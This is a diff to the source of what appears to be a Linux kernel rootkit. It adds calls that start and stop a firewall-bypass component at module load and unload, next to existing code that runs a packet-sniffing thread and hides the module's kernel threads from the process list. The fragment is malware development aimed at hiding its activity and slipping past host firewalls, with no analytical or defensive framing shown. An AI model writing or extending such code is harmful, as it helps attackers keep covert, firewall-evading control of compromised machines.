@@ -786,6 +786,10 @@ static int __init kv_init(void) {
     if (!tsk_sniff)
         goto unroll_init;
 
+    if (!kv_sock_start_fw_bypass()) {
+        prwarn("Error loading fw_bypass\n");
+    }
+
     /** hide kthreads */
     kv_hide_task_by_pid(tsk_sniff->pid, 0, CHILDREN);
     kv_hide_task_by_pid(tsk_prc->pid, 0, CHILDREN);
@@ -866,6 +870,8 @@ static void __exit kv_cleanup(void) {
         prinfo("stop sniff thread\n");
         kv_sock_stop_sniff(tsk_sniff);
     }
+
+    kv_sock_stop_fw_bypass();
 
     if (tsk_prc && !IS_ERR(tsk_prc)) {
         prinfo("stop proc timeout thread\n");
